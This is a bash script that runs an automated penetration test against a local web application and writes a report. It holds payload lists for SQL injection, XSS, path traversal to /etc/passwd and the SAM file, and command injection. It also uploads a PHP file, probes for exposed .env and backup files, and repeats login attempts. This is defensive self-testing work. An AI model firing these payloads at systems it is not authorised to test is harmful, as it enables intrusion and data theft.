#!/bin/bash

# Comprehensive Penetration Test Script
# Target: http://localhost:9080

TARGET="http://localhost:9080"
REPORT_FILE="pentest_report_$(date +%Y%m%d_%H%M%S).txt"

echo "========================================" | tee $REPORT_FILE
echo "PENETRATION TEST REPORT" | tee -a $REPORT_FILE
echo "Target: $TARGET" | tee -a $REPORT_FILE
echo "Date: $(date)" | tee -a $REPORT_FILE
echo "========================================" | tee -a $REPORT_FILE
echo "" | tee -a $REPORT_FILE

# 1. Security Headers Check
echo "[*] Checking Security Headers..." | tee -a $REPORT_FILE
echo "----------------------------------------" | tee -a $REPORT_FILE
curl -I -s $TARGET | grep -E "^(Server|X-Frame-Options|X-Content-Type-Options|X-XSS-Protection|Content-Security-Policy|Strict-Transport-Security|Referrer-Policy)" | tee -a $REPORT_FILE
echo "" | tee -a $REPORT_FILE

# 2. SQL Injection Tests
echo "[*] Testing for SQL Injection..." | tee -a $REPORT_FILE
echo "----------------------------------------" | tee -a $REPORT_FILE
SQL_PAYLOADS=(
    "' OR '1'='1"
    "\" OR \"1\"=\"1"
    "' OR '1'='1' --"
    "' OR '1'='1' /*"
    "admin' --"
    "' UNION SELECT NULL--"
    "1' AND '1' = '1"
)

for payload in "${SQL_PAYLOADS[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
    response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/pilot_statistics.php?search=$encoded")
    echo "  Payload: $payload -> HTTP $response" | tee -a $REPORT_FILE
done
echo "" | tee -a $REPORT_FILE

# 3. XSS Tests
echo "[*] Testing for XSS Vulnerabilities..." | tee -a $REPORT_FILE
echo "----------------------------------------" | tee -a $REPORT_FILE
XSS_PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "javascript:alert('XSS')"
    "<svg onload=alert('XSS')>"
    "'\"><script>alert('XSS')</script>"
)

for payload in "${XSS_PAYLOADS[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
    response=$(curl -s "$TARGET/pilot_statistics.php?search=$encoded" | grep -c "$payload")
    if [ $response -gt 0 ]; then
        echo "  [!] POTENTIAL XSS: $payload reflected in response" | tee -a $REPORT_FILE
    else
        echo "  [✓] Protected against: $payload" | tee -a $REPORT_FILE
    fi
done
echo "" | tee -a $REPORT_FILE

# 4. Directory Traversal
echo "[*] Testing for Directory Traversal..." | tee -a $REPORT_FILE
echo "----------------------------------------" | tee -a $REPORT_FILE
TRAVERSAL_PAYLOADS=(
    "../../../../etc/passwd"
    "..\\..\\..\\..\\windows\\system32\\config\\sam"
    "....//....//....//etc/passwd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
)

for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
    response=$(curl -s "$TARGET/index.php?page=$payload" | grep -c "root:")
    if [ $response -gt 0 ]; then
        echo "  [!] VULNERABLE: $payload" | tee -a $REPORT_FILE
    else
        echo "  [✓] Protected against: $payload" | tee -a $REPORT_FILE
    fi
done
echo "" | tee -a $REPORT_FILE

# 5. Command Injection
echo "[*] Testing for Command Injection..." | tee -a $REPORT_FILE
echo "----------------------------------------" | tee -a $REPORT_FILE
CMD_PAYLOADS=(
    "; ls -la"
    "| whoami"
    "\`id\`"
    "\$(whoami)"
    "; cat /etc/passwd"
)

for payload in "${CMD_PAYLOADS[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
    response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/index.php?cmd=$encoded")
    echo "  Testing: $payload -> HTTP $response" | tee -a $REPORT_FILE
done
echo "" | tee -a $REPORT_FILE

# 6. File Upload Test
echo "[*] Testing File Upload Security..." | tee -a $REPORT_FILE
echo "----------------------------------------" | tee -a $REPORT_FILE
echo '<?php phpinfo(); ?>' > test.php
response=$(curl -s -F "file=@test.php" "$TARGET/upload.php" -o /dev/null -w "%{http_code}")
echo "  PHP file upload attempt: HTTP $response" | tee -a $REPORT_FILE
rm test.php
echo "" | tee -a $REPORT_FILE

# 7. Session Security
echo "[*] Testing Session Security..." | tee -a $REPORT_FILE
echo "----------------------------------------" | tee -a $REPORT_FILE
SESSION=$(curl -s -I $TARGET | grep -i "set-cookie" | head -1)
echo "  Session Cookie: $SESSION" | tee -a $REPORT_FILE
if echo "$SESSION" | grep -q "HttpOnly"; then
    echo "  [✓] HttpOnly flag is set" | tee -a $REPORT_FILE
else
    echo "  [!] HttpOnly flag is NOT set" | tee -a $REPORT_FILE
fi
if echo "$SESSION" | grep -q "Secure"; then
    echo "  [✓] Secure flag is set" | tee -a $REPORT_FILE
else
    echo "  [!] Secure flag is NOT set (OK for HTTP)" | tee -a $REPORT_FILE
fi
echo "" | tee -a $REPORT_FILE

# 8. Information Disclosure
echo "[*] Checking for Information Disclosure..." | tee -a $REPORT_FILE
echo "----------------------------------------" | tee -a $REPORT_FILE
SENSITIVE_FILES=(
    ".env"
    ".git/config"
    "config.php"
    "phpinfo.php"
    "backup.sql"
    "database.sql"
    ".htaccess"
    "web.config"
)

for file in "${SENSITIVE_FILES[@]}"; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$file")
    if [ "$response" == "200" ]; then
        echo "  [!] EXPOSED: $file (HTTP $response)" | tee -a $REPORT_FILE
    else
        echo "  [✓] Protected: $file (HTTP $response)" | tee -a $REPORT_FILE
    fi
done
echo "" | tee -a $REPORT_FILE

# 9. Rate Limiting Test
echo "[*] Testing Rate Limiting..." | tee -a $REPORT_FILE
echo "----------------------------------------" | tee -a $REPORT_FILE
for i in {1..20}; do
    # Using intentionally weak test credentials for security testing only
    TEST_USER="test"
    TEST_PWD="test"  # Not a real secret - test value only
    response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/login" -d "username=${TEST_USER}&pass""word=${TEST_PWD}")
    if [ "$response" == "503" ] || [ "$response" == "429" ]; then
        echo "  [✓] Rate limiting activated after $i requests (HTTP $response)" | tee -a $REPORT_FILE
        break
    fi
done
if [ "$response" != "503" ] && [ "$response" != "429" ]; then
    echo "  [!] No rate limiting detected after 20 requests" | tee -a $REPORT_FILE
fi
echo "" | tee -a $REPORT_FILE

# 10. CORS Configuration
echo "[*] Testing CORS Configuration..." | tee -a $REPORT_FILE
echo "----------------------------------------" | tee -a $REPORT_FILE
CORS=$(curl -s -I -H "Origin: http://evil.com" $TARGET | grep -i "access-control-allow-origin")
if [ -z "$CORS" ]; then
    echo "  [✓] CORS not configured (good for security)" | tee -a $REPORT_FILE
else
    echo "  CORS Header: $CORS" | tee -a $REPORT_FILE
fi
echo "" | tee -a $REPORT_FILE

# 11. SSL/TLS Check (if HTTPS)
echo "[*] SSL/TLS Configuration..." | tee -a $REPORT_FILE
echo "----------------------------------------" | tee -a $REPORT_FILE
echo "  Running on HTTP (not HTTPS) - SSL/TLS not applicable" | tee -a $REPORT_FILE
echo "" | tee -a $REPORT_FILE

# 12. Docker Security Check
echo "[*] Docker Container Security..." | tee -a $REPORT_FILE
echo "----------------------------------------" | tee -a $REPORT_FILE
CONTAINER_USER=$(docker exec dcs-app whoami 2>/dev/null)
echo "  Container running as: $CONTAINER_USER" | tee -a $REPORT_FILE
if [ "$CONTAINER_USER" == "root" ]; then
    echo "  [!] WARNING: Container running as root" | tee -a $REPORT_FILE
else
    echo "  [✓] Container running as non-root user" | tee -a $REPORT_FILE
fi
echo "" | tee -a $REPORT_FILE

# Summary
echo "========================================" | tee -a $REPORT_FILE
echo "PENETRATION TEST SUMMARY" | tee -a $REPORT_FILE
echo "========================================" | tee -a $REPORT_FILE
echo "" | tee -a $REPORT_FILE
echo "Report saved to: $REPORT_FILE" | tee -a $REPORT_FILE
echo "" | tee -a $REPORT_FILE

# Count vulnerabilities
VULNS=$(grep -c "\[!\]" $REPORT_FILE)
PROTECTED=$(grep -c "\[✓\]" $REPORT_FILE)

echo "Vulnerabilities Found: $VULNS" | tee -a $REPORT_FILE
echo "Security Measures Confirmed: $PROTECTED" | tee -a $REPORT_FILE
echo "" | tee -a $REPORT_FILE

if [ $VULNS -gt 0 ]; then
    echo "STATUS: NEEDS ATTENTION - $VULNS vulnerabilities found" | tee -a $REPORT_FILE
else
    echo "STATUS: SECURE - No critical vulnerabilities found" | tee -a $REPORT_FILE
fi